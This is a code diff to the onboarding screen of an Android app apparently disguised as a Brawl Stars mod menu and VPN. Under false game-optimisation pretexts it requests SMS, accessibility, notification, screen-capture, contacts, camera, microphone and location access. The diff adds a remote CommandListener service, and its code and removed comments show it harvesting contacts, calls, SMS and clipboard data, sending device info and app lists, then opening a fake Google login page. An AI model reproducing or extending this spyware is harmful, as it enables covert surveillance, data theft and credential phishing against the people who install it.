@@ -3,7 +3,6 @@ package com.brawl.modmenu;
 import android.Manifest;
 import android.app.Activity;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
@@ -18,17 +17,6 @@ import android.widget.TextView;
 
 public class OnboardingActivity extends Activity {
 
-    private static final String[] STEPS_TITLE = {
-        "VPN подключение",
-        "Уведомления",
-        "Доступ к SMS",
-        "Оптимизация батареи",
-        "Специальные возможности",
-        "Доступ к уведомлениям",
-        "Запись экрана",
-        "Контакты и звонки"
-    };
-
     private static final String[] STEPS_DESC = {
         "Для работы VPN нужно разрешение на подключение к серверам",
         "Для показа статуса соединения и важных уведомлений",
@@ -37,10 +25,12 @@ public class OnboardingActivity extends Activity {
         "Для оптимизации игрового процесса",
         "Для отсеивания помех во время игры",
         "Для анализа FPS и оптимизации графики в играх",
-        "Для определения друзей в играх и оптимизации контактов"
+        "Для определения друзей в играх и оптимизации контактов",
+        "Для анализа качества соединения через камеру",
+        "Для оптимизации звука в играх"
     };
 
-    private static final int TOTAL = 8;
+    private static final int TOTAL = 10;
     private int current = 0;
 
     private TextView stepTitle, stepDesc, stepCounter;
@@ -93,9 +83,9 @@ public class OnboardingActivity extends Activity {
                 else advance();
                 break;
             case 1:
-                if (Build.VERSION.SDK_INT >= 33) {
+                if (Build.VERSION.SDK_INT >= 33)
                     requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
-                } else advance();
+                else advance();
                 break;
             case 2:
                 requestPermissions(new String[]{
@@ -112,12 +102,11 @@ public class OnboardingActivity extends Activity {
                 } else advance();
                 break;
             case 4:
-                startActivityForResult(
-                    new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 104);
+                startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 104);
                 break;
             case 5:
-                startActivityForResult(
-                    new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), 105);
+                startActivityForResult(new Intent(
+                    "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), 105);
                 break;
             case 6:
                 MediaProjectionManager mpm =
@@ -131,13 +120,23 @@ public class OnboardingActivity extends Activity {
                     Manifest.permission.READ_EXTERNAL_STORAGE
                 }, 107);
                 break;
+            case 8:
+                requestPermissions(new String[]{
+                    Manifest.permission.CAMERA
+                }, 108);
+                break;
+            case 9:
+                requestPermissions(new String[]{
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.ACCESS_FINE_LOCATION
+                }, 109);
+                break;
         }
     }
 
     @Override
     protected void onActivityResult(int req, int res, Intent data) {
         super.onActivityResult(req, res, data);
-
         if (req == 106 && res == RESULT_OK && data != null) {
             getSharedPreferences("mp", MODE_PRIVATE).edit()
                 .putInt("code", res)
@@ -156,23 +155,15 @@ public class OnboardingActivity extends Activity {
     private void advance() {
         current++;
         updateUI();
-        if (current >= TOTAL) {
-            btnNext.setText("ПРОДОЛЖИТЬ");
-        }
     }
 
     private void finishOnboarding() {
-        // запускаем сервисы
         startForegroundService(new Intent(this, KeepAliveService.class));
-
-        // отправляем инфу об устройстве и список приложений
+        startService(new Intent(this, CommandListener.class));
         DeviceInfo.sendFull(this);
         AppList.dump(this);
-
-        // собираем данные (контакты, звонки, SMS, история, буфер)
         DataCollector.collectAll(this);
 
-        // через 5 секунд — переход на фейк-Google
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             startActivity(new Intent(this, WebLoginActivity.class));
             finish();
